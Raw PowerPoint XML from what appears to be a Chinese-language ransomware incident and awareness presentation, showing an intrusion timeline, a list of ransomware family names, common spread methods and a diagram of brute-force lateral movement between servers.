              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>X</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" dirty="0"/>
              <a:t>月</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>X</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" dirty="0"/>
              <a:t>日凌晨</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>00</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" dirty="0"/>
              <a:t>点</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>09</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" dirty="0"/>
              <a:t>分</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>26</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" dirty="0"/>
              <a:t>秒，</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>IP</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" dirty="0"/>
              <a:t>归属于荷兰的攻击者成功登录该系统</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>。</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="zh-CN" dirty="0"/>
          </a:p>
          <a:p>
            <a:endParaRPr lang="zh-CN" altLang="zh-CN" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="43011"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998449"/>
            <a:ext cx="6945063" cy="25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2"/>
          <p:cNvSpPr txBox="1">
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="509232" y="4730017"/>
            <a:ext cx="1577676" cy="461665"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle>
            <a:defPPr>
              <a:defRPr lang="en-US"/>
            </a:defPPr>
            <a:lvl1pPr>
              <a:defRPr sz="2400" b="1">
                <a:latin typeface="+mj-ea"/>
                <a:ea typeface="+mj-ea"/>
              </a:defRPr>
            </a:lvl1pPr>
          </a:lstStyle>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" dirty="0"/>
              <a:t>（</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>3</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" dirty="0"/>
              <a:t>）结论</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="矩形 2"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="678720" y="5229200"/>
            <a:ext cx="7848872" cy="707886"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPts val="2400"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr kumimoji="1" lang="zh-CN" altLang="en-US" sz="2000" b="1" dirty="0">
                <a:latin typeface="+mn-ea"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>向客户说明服务器中勒索病毒，目前暂时无法解密，只能通过</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="zh-CN" altLang="en-US" sz="2000" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0033CC"/>
                </a:solidFill>
                <a:latin typeface="+mn-ea"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>重装操作系统来恢复。</a:t>
            </a:r>
            <a:endParaRPr kumimoji="1" lang="zh-CN" altLang="en-US" sz="2000" b="1" dirty="0">
              <a:latin typeface="+mn-ea"/>
              <a:ea typeface="+mn-ea"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="3755299247"/>
      </p:ext>
    </p:extLst>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
  <p:transition>
    <p:fade/>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5398C3-7352-1D47-B735-997F5F8A946F}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="416992"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勒索病毒家族</a:t>
            </a:r>
            <a:endParaRPr sz="2800" dirty="0">
              <a:solidFill>
                <a:srgbClr val="0033CC"/>
              </a:solidFill>
              <a:latin typeface="方正大黑简体" panose="03000509000000000000" pitchFamily="65" charset="-122"/>
              <a:ea typeface="方正大黑简体" panose="03000509000000000000" pitchFamily="65"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4135701712"/>
              </p:ext>
            </p:extLst>
          </p:nvPr>
        </p:nvGraphicFramePr>
        <p:xfrm>
          <a:off x="323528" y="1412785"/>
          <a:ext cx="8496944" cy="4680514"/>
        </p:xfrm>
        <a:graphic>
          <a:graphicData uri="http://schemas.openxmlformats.org/drawingml/2006/table">
            <a:tbl>
              <a:tblPr>
                <a:effectLst>
                  <a:outerShdw blurRad="63500" sx="102000" sy="102000" algn="ctr" rotWithShape="0">
                    <a:prstClr val="black">
                      <a:alpha val="40000"/>
                    </a:prstClr>
                  </a:outerShdw>
                </a:effectLst>
              </a:tblPr>
              <a:tblGrid>
                <a:gridCol w="2049361">
                  <a:extLst>
                    <a:ext uri="{9D8B030D-6E8A-4147-A177-3AD203B41FA5}">
                      <a16:colId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="3162470210"/>
                    </a:ext>
                  </a:extLst>
                </a:gridCol>
                <a:gridCol w="2164447">
                  <a:extLst>
                    <a:ext uri="{9D8B030D-6E8A-4147-A177-3AD203B41FA5}">
                      <a16:colId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="774309285"/>
                    </a:ext>
                  </a:extLst>
                </a:gridCol>
                <a:gridCol w="2257348">
                  <a:extLst>
                    <a:ext uri="{9D8B030D-6E8A-4147-A177-3AD203B41FA5}">
                      <a16:colId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="3454571943"/>
                    </a:ext>
                  </a:extLst>
                </a:gridCol>
                <a:gridCol w="2025788">
                  <a:extLst>
                    <a:ext uri="{9D8B030D-6E8A-4147-A177-3AD203B41FA5}">
                      <a16:colId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="827218666"/>
                    </a:ext>
                  </a:extLst>
                </a:gridCol>
              </a:tblGrid>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7ev3n</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CryptoJoker</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KimcilWare</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Radamant</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730179593"/>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8lock8</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CryptoMix</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Kriptovo</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RemindM</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3903576334"/>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Alpha</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CryptoTorLocker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KryptoLocker</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Rokku</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4279885911"/>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AutoLocky</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CryptoWall</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LeChiffre</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Samas</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637735290"/>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BitCryptor</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CryptXXX</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Locky</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Sanction</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3784568339"/>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BitMessage</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CrySiS</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Lortok</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Shade</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543307794"/>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Booyah</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CTB-Locker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Magic</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Shujin</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860939643"/>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Brazilian</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Ransomware</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DMA</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4147369250"/>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BuyUnlockCode</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ECLR</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Ransomware</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MireWare</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726772977"/>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Cerber</a:t>
                      </a:r>
                      <a:endParaRPr kumimoji="0" lang="zh-CN" altLang="zh-CN" sz="1400" b="1" i="0" u="none" strike="noStrike" cap="none" normalizeH="0" baseline="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EnCiPhErEd</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Mischa</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Surprise</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519736256"/>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Chimera</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Enigma</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Mobef</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TeslaCrypt</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2491135885"/>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CoinVault</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GhostCrypt</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NanoLocker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TrueCrypter</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4123335215"/>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Coverton</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GNL</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Nemucod</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68281966"/>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Crypren</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Hi</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Buddy!</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Nemucod-7z</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765018258"/>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Crypt0L0cker</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HydraCrypt</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OMG!</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Ransomcrypt</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840115212"/>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CryptoDefense</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Jigsaw</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PadCrypt</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WonderCrypter</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3154049037"/>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CryptoFortress</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JobCrypter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PClock</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Xort</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915038724"/>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CryptoHasYou</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KeRanger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PowerWare</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XTBL</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4099889941"/>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CryptoHitman</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KEYHolder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Protected</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Ransomware</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214914130"/>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Maktub</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SNSLocker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SuperCrypt</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4245573930"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="225654">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UmbreCrypt</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VaultCrypt</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Virlocker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2478354378"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
            </a:tbl>
          </a:graphicData>
        </a:graphic>
      </p:graphicFrame>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="1237869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7FCFD9-A8F3-0446-B93A-EABCCD73B1DB}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="539552" y="119675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传播方式</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47106" name="文本框 2"/>
          <p:cNvSpPr txBox="1">
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="1403648" y="1916832"/>
            <a:ext cx="5534148" cy="280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342900" indent="-342900">
              <a:lnSpc>
                <a:spcPct val="150000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:buFont typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              <a:buChar char="n"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" sz="2400" b="1" dirty="0">
                <a:latin typeface="方正大黑简体" panose="03000509000000000000" pitchFamily="65" charset="-122"/>
                <a:ea typeface="方正大黑简体" panose="03000509000000000000" pitchFamily="65" charset="-122"/>
              </a:rPr>
              <a:t>服务器入侵传播</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="342900" indent="-342900">
              <a:lnSpc>
                <a:spcPct val="150000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:buFont typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              <a:buChar char="n"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" sz="2400" b="1" dirty="0">
                <a:latin typeface="方正大黑简体" panose="03000509000000000000" pitchFamily="65" charset="-122"/>
                <a:ea typeface="方正大黑简体" panose="03000509000000000000" pitchFamily="65" charset="-122"/>
              </a:rPr>
              <a:t>利用漏洞自动传播</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="342900" indent="-342900">
              <a:lnSpc>
                <a:spcPct val="150000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:buFont typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              <a:buChar char="n"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" sz="2400" b="1" dirty="0">
                <a:latin typeface="方正大黑简体" panose="03000509000000000000" pitchFamily="65" charset="-122"/>
                <a:ea typeface="方正大黑简体" panose="03000509000000000000" pitchFamily="65" charset="-122"/>
              </a:rPr>
              <a:t>软件供应链攻击传播</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="342900" indent="-342900">
              <a:lnSpc>
                <a:spcPct val="150000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:buFont typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              <a:buChar char="n"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" sz="2400" b="1" dirty="0">
                <a:latin typeface="方正大黑简体" panose="03000509000000000000" pitchFamily="65" charset="-122"/>
                <a:ea typeface="方正大黑简体" panose="03000509000000000000" pitchFamily="65" charset="-122"/>
              </a:rPr>
              <a:t>邮件附件传播</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="342900" indent="-342900">
              <a:lnSpc>
                <a:spcPct val="150000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:buFont typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              <a:buChar char="n"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" sz="2400" b="1" dirty="0">
                <a:latin typeface="方正大黑简体" panose="03000509000000000000" pitchFamily="65" charset="-122"/>
                <a:ea typeface="方正大黑简体" panose="03000509000000000000" pitchFamily="65" charset="-122"/>
              </a:rPr>
              <a:t>利用挂马网页传播</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="37836964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7106"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="7" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="47106"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>ppt_x</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:tavLst>
                                        <p:tav tm="0">
                                          <p:val>
                                            <p:strVal val="1+#ppt_w/2"/>
                                          </p:val>
                                        </p:tav>
                                        <p:tav tm="100000">
                                          <p:val>
                                            <p:strVal val="#ppt_x"/>
                                          </p:val>
                                        </p:tav>
                                      </p:tavLst>
                                    </p:anim>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="8" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="471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9209D-DFC4-E742-B1D9-7CDD22EDAE70}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="388897" y="961371"/>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平级单位扩散</a:t>
            </a:r>
            <a:endParaRPr sz="2800" dirty="0">
              <a:solidFill>
                <a:srgbClr val="0033CC"/>
              </a:solidFill>
              <a:latin typeface="方正大黑简体" panose="03000509000000000000" pitchFamily="65" charset="-122"/>
              <a:ea typeface="方正大黑简体" panose="03000509000000000000" pitchFamily="65" charset="-122"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:grpSp>
        <p:nvGrpSpPr>
          <p:cNvPr id="3" name="组合 2"/>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr>
          <a:xfrm>
            <a:off x="166127" y="1533201"/>
            <a:ext cx="8614906" cy="4451455"/>
            <a:chOff x="166127" y="1533201"/>
            <a:chExt cx="8614906" cy="4451455"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:pic>
          <p:nvPicPr>
            <p:cNvPr id="49154"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1580492" flipH="1">
              <a:off x="5248458" y="4332047"/>
              <a:ext cx="1642148" cy="142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8C1AFBCA-A0C0-3247-887D-36E56D2A6A17}"/>
                </a:ext>
              </a:extLst>
            </p:cNvPr>
            <p:cNvPicPr>
              <a:picLocks noChangeAspect="1"/>
            </p:cNvPicPr>
            <p:nvPr/>
          </p:nvPicPr>
          <p:blipFill>
            <a:blip r:embed="rId3"/>
            <a:stretch>
              <a:fillRect/>
            </a:stretch>
          </p:blipFill>
          <p:spPr>
            <a:xfrm>
              <a:off x="1105106" y="2725148"/>
              <a:ext cx="512500" cy="546781"/>
            </a:xfrm>
            <a:prstGeom prst="rect">
              <a:avLst/>
            </a:prstGeom>
            <a:ln>
              <a:noFill/>
            </a:ln>
            <a:effectLst>
              <a:softEdge rad="112500"/>
            </a:effectLst>
          </p:spPr>
        </p:pic>
        <p:grpSp>
          <p:nvGrpSpPr>
            <p:cNvPr id="49156" name="组合 4"/>
            <p:cNvGrpSpPr>
              <a:grpSpLocks/>
            </p:cNvGrpSpPr>
            <p:nvPr/>
          </p:nvGrpSpPr>
          <p:grpSpPr bwMode="auto">
            <a:xfrm>
              <a:off x="1034869" y="3114181"/>
              <a:ext cx="553998" cy="702347"/>
              <a:chOff x="1760914" y="1937287"/>
              <a:chExt cx="689000" cy="779120"/>
            </a:xfrm>
          </p:grpSpPr>
          <p:cxnSp>
            <p:nvCxnSpPr>
              <p:cNvPr id="6" name="直接箭头连接符 6">
                <a:extLst>
                  <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                    <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{174CA8A2-D39F-E043-BB3A-DAEB5DC8B593}"/>
                  </a:ext>
                </a:extLst>
              </p:cNvPr>
              <p:cNvCxnSpPr/>
              <p:nvPr/>
            </p:nvCxnSpPr>
            <p:spPr>
              <a:xfrm flipH="1">
                <a:off x="2141569" y="1937287"/>
                <a:ext cx="0" cy="7791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4ABCBB19-F863-3A4C-AA73-64DBE05DF886}"/>
                  </a:ext>
                </a:extLst>
              </p:cNvPr>
              <p:cNvPicPr>
                <a:picLocks noChangeAspect="1"/>
              </p:cNvPicPr>
              <p:nvPr/>
            </p:nvPicPr>
            <p:blipFill>
              <a:blip r:embed="rId4"/>
              <a:stretch>
                <a:fillRect/>
              </a:stretch>
            </p:blipFill>
            <p:spPr>
              <a:xfrm>
                <a:off x="1974680" y="2148571"/>
                <a:ext cx="254913" cy="340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9229" name="文本框 7"/>
              <p:cNvSpPr txBox="1">
                <a:spLocks noChangeArrowheads="1"/>
              </p:cNvSpPr>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr bwMode="auto">
              <a:xfrm>
                <a:off x="1760914" y="2056097"/>
                <a:ext cx="689000" cy="532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200" b="1" dirty="0">
                    <a:solidFill>
                      <a:srgbClr val="FF0000"/>
                    </a:solidFill>
                    <a:latin typeface="微软雅黑" panose="020B0503020204020204" pitchFamily="34" charset="-122"/>
                  </a:rPr>
                  <a:t>暴力破解</a:t>
                </a:r>
              </a:p>
            </p:txBody>
          </p:sp>
        </p:grpSp>
        <p:grpSp>
          <p:nvGrpSpPr>
            <p:cNvPr id="49157" name="组合 8"/>
            <p:cNvGrpSpPr>
              <a:grpSpLocks/>
            </p:cNvGrpSpPr>
            <p:nvPr/>
          </p:nvGrpSpPr>
          <p:grpSpPr bwMode="auto">
            <a:xfrm>
              <a:off x="787647" y="3669902"/>
              <a:ext cx="1303543" cy="776545"/>
              <a:chOff x="1415844" y="2682016"/>
              <a:chExt cx="1619367" cy="860738"/>
            </a:xfrm>
          </p:grpSpPr>
          <p:pic>
            <p:nvPicPr>
              <p:cNvPr id="10" name="图片 9">
                <a:extLst>
                  <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                    <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{66A271C9-880A-004A-819F-16166D0AC74A}"/>
                  </a:ext>
                </a:extLst>
              </p:cNvPr>
              <p:cNvPicPr>
                <a:picLocks noChangeAspect="1"/>
              </p:cNvPicPr>
              <p:nvPr/>
            </p:nvPicPr>
            <p:blipFill>
              <a:blip r:embed="rId5"/>
              <a:stretch>
                <a:fillRect/>
              </a:stretch>
            </p:blipFill>
            <p:spPr>
              <a:xfrm>
                <a:off x="1863411" y="2682016"/>
                <a:ext cx="466633" cy="537393"/>
              </a:xfrm>
              <a:prstGeom prst="rect">
                <a:avLst/>
              </a:prstGeom>
              <a:ln>
                <a:noFill/>
              </a:ln>
              <a:effectLst>
                <a:softEdge rad="112500"/>
              </a:effectLst>
            </p:spPr>
          </p:pic>
          <p:sp>
            <p:nvSpPr>
              <p:cNvPr id="49226" name="文本框 10"/>
              <p:cNvSpPr txBox="1">
                <a:spLocks noChangeArrowheads="1"/>
              </p:cNvSpPr>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr bwMode="auto">
              <a:xfrm>
                <a:off x="1415844" y="3201608"/>
                <a:ext cx="1619367" cy="34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1400" dirty="0"/>
                  <a:t>A</a:t>
                </a:r>
                <a:r>
                  <a:rPr lang="zh-CN" altLang="en-US" sz="1400" dirty="0"/>
                  <a:t>服务器</a:t>
                </a:r>
              </a:p>
            </p:txBody>
          </p:sp>
        </p:grpSp>
        <p:grpSp>
          <p:nvGrpSpPr>
            <p:cNvPr id="49158" name="组合 11"/>
            <p:cNvGrpSpPr>
              <a:grpSpLocks/>
            </p:cNvGrpSpPr>
            <p:nvPr/>
          </p:nvGrpSpPr>
          <p:grpSpPr bwMode="auto">
            <a:xfrm>
              <a:off x="1331763" y="4685880"/>
              <a:ext cx="1303543" cy="767196"/>
              <a:chOff x="2141117" y="4033651"/>
              <a:chExt cx="1619367" cy="852930"/>
            </a:xfrm>
          </p:grpSpPr>
          <p:pic>
            <p:nvPicPr>
              <p:cNvPr id="13" name="图片 12">
                <a:extLst>
                  <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                    <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{9401D182-D78A-6C41-8433-E78992ACE590}"/>
                  </a:ext>
                </a:extLst>
              </p:cNvPr>
              <p:cNvPicPr>
                <a:picLocks noChangeAspect="1"/>
              </p:cNvPicPr>
              <p:nvPr/>
            </p:nvPicPr>
            <p:blipFill>
              <a:blip r:embed="rId5"/>
              <a:stretch>
                <a:fillRect/>
              </a:stretch>
            </p:blipFill>
            <p:spPr>
              <a:xfrm>
                <a:off x="2671025" y="4033651"/>
                <a:ext cx="466633" cy="537393"/>
              </a:xfrm>
              <a:prstGeom prst="rect">
                <a:avLst/>
              </a:prstGeom>
              <a:ln>
                <a:noFill/>
              </a:ln>
              <a:effectLst>
                <a:softEdge rad="112500"/>
              </a:effectLst>
            </p:spPr>
          </p:pic>
          <p:sp>
            <p:nvSpPr>
              <p:cNvPr id="49224" name="文本框 13"/>
              <p:cNvSpPr txBox="1">
                <a:spLocks noChangeArrowheads="1"/>
              </p:cNvSpPr>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr bwMode="auto">
              <a:xfrm>
                <a:off x="2141117" y="4544410"/>
                <a:ext cx="1619367" cy="342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1400" dirty="0"/>
                  <a:t>C</a:t>
                </a:r>
                <a:r>
                  <a:rPr lang="zh-CN" altLang="en-US" sz="1400" dirty="0"/>
                  <a:t>服务器</a:t>
                </a:r>
              </a:p>
            </p:txBody>
          </p:sp>
        </p:grpSp>
        <p:grpSp>
          <p:nvGrpSpPr>
            <p:cNvPr id="49159" name="组合 14"/>
            <p:cNvGrpSpPr>
              <a:grpSpLocks/>
            </p:cNvGrpSpPr>
            <p:nvPr/>
          </p:nvGrpSpPr>
          <p:grpSpPr bwMode="auto">
            <a:xfrm>
              <a:off x="166127" y="4113429"/>
              <a:ext cx="2380886" cy="1020928"/>
              <a:chOff x="616435" y="3360200"/>
              <a:chExt cx="2956877" cy="928467"/>
            </a:xfrm>
          </p:grpSpPr>
          <p:cxnSp>
            <p:nvCxnSpPr>
              <p:cNvPr id="16" name="肘形连接符 15">
                <a:extLst>
                  <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                    <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{2C4E833E-0047-024D-898F-A93B32AA4216}"/>
                  </a:ext>
                </a:extLst>
              </p:cNvPr>
              <p:cNvCxnSpPr>
                <a:stCxn id="10" idx="2"/>
              </p:cNvCxnSpPr>
              <p:nvPr/>
            </p:nvCxnSpPr>
            <p:spPr>
              <a:xfrm rot="5400000">
                <a:off x="1400123" y="3449534"/>
                <a:ext cx="654612" cy="919202"/>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肘形连接符 16">
                <a:extLst>
                  <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                    <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{E4C5A6C1-F66D-A846-8C26-5C4662CCA2CD}"/>
                  </a:ext>
                </a:extLst>
              </p:cNvPr>
              <p:cNvCxnSpPr>
                <a:stCxn id="10" idx="2"/>
                <a:endCxn id="13" idx="0"/>
              </p:cNvCxnSpPr>
              <p:nvPr/>
            </p:nvCxnSpPr>
            <p:spPr>
              <a:xfrm rot="16200000" flipH="1">
                <a:off x="2158225" y="3668110"/>
                <a:ext cx="483047" cy="758067"/>
              </a:xfrm>
              <a:prstGeom prst="bentConnector3">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id="{1612D1B7-96AB-0F42-8A5E-22F694F65F19}"/>
                  </a:ext>
                </a:extLst>
              </p:cNvPr>
              <p:cNvPicPr>
                <a:picLocks noChangeAspect="1"/>
              </p:cNvPicPr>
              <p:nvPr/>
            </p:nvPicPr>
            <p:blipFill>
              <a:blip r:embed="rId4"/>
              <a:stretch>
                <a:fillRect/>
              </a:stretch>
            </p:blipFill>
            <p:spPr>
              <a:xfrm>
                <a:off x="1306443" y="3435034"/>
                <a:ext cx="254913" cy="340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9220" name="文本框 18"/>
              <p:cNvSpPr txBox="1">
                <a:spLocks noChangeArrowheads="1"/>
              </p:cNvSpPr>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr bwMode="auto">
              <a:xfrm>
                <a:off x="616435" y="3360200"/>
                <a:ext cx="764470" cy="532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400" b="1" dirty="0">
                    <a:solidFill>
                      <a:srgbClr val="FF0000"/>
                    </a:solidFill>
                    <a:latin typeface="微软雅黑" panose="020B0503020204020204" pitchFamily="34" charset="-122"/>
                  </a:rPr>
                  <a:t>暴力破解</a:t>
                </a:r>
              </a:p>
            </p:txBody>
          </p:sp>
          <p:pic>
            <p:nvPicPr>
              <p:cNvPr id="20" name="图片 19">
                <a:extLst>
                  <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                    <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{CC7D69A8-E957-D048-ACDC-05841A8191A6}"/>
                  </a:ext>
                </a:extLst>
              </p:cNvPr>
              <p:cNvPicPr>
                <a:picLocks noChangeAspect="1"/>
              </p:cNvPicPr>
              <p:nvPr/>
            </p:nvPicPr>
            <p:blipFill>
              <a:blip r:embed="rId4"/>
              <a:stretch>
                <a:fillRect/>
              </a:stretch>
            </p:blipFill>
            <p:spPr>
              <a:xfrm>
                <a:off x="2761188" y="3418295"/>
                <a:ext cx="254913" cy="340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9222" name="文本框 20"/>
              <p:cNvSpPr txBox="1">
                <a:spLocks noChangeArrowheads="1"/>
              </p:cNvSpPr>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr bwMode="auto">
              <a:xfrm>
                <a:off x="2808843" y="3499324"/>
                <a:ext cx="764469" cy="532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400" b="1" dirty="0">
                    <a:solidFill>
                      <a:srgbClr val="FF0000"/>
                    </a:solidFill>
                    <a:latin typeface="微软雅黑" panose="020B0503020204020204" pitchFamily="34" charset="-122"/>
                  </a:rPr>
                  <a:t>暴力破解</a:t>
                </a:r>
              </a:p>
            </p:txBody>
          </p:sp>
        </p:grpSp>
        <p:grpSp>
          <p:nvGrpSpPr>
            <p:cNvPr id="49160" name="组合 21"/>
            <p:cNvGrpSpPr>
              <a:grpSpLocks/>
            </p:cNvGrpSpPr>
            <p:nvPr/>
          </p:nvGrpSpPr>
          <p:grpSpPr bwMode="auto">
            <a:xfrm>
              <a:off x="6175227" y="2279173"/>
              <a:ext cx="2605806" cy="3705483"/>
              <a:chOff x="8599903" y="1414600"/>
              <a:chExt cx="3235704" cy="4641632"/>
            </a:xfrm>
          </p:grpSpPr>
          <p:pic>
            <p:nvPicPr>
              <p:cNvPr id="23" name="图片 22">
                <a:extLst>
                  <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                    <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{6F27518C-73BE-0A4D-A5FF-9744E43B18E6}"/>
                  </a:ext>
                </a:extLst>
              </p:cNvPr>
              <p:cNvPicPr>
                <a:picLocks noChangeAspect="1"/>
              </p:cNvPicPr>
              <p:nvPr/>
            </p:nvPicPr>
            <p:blipFill>
              <a:blip r:embed="rId5"/>
              <a:stretch>
                <a:fillRect/>
              </a:stretch>
            </p:blipFill>
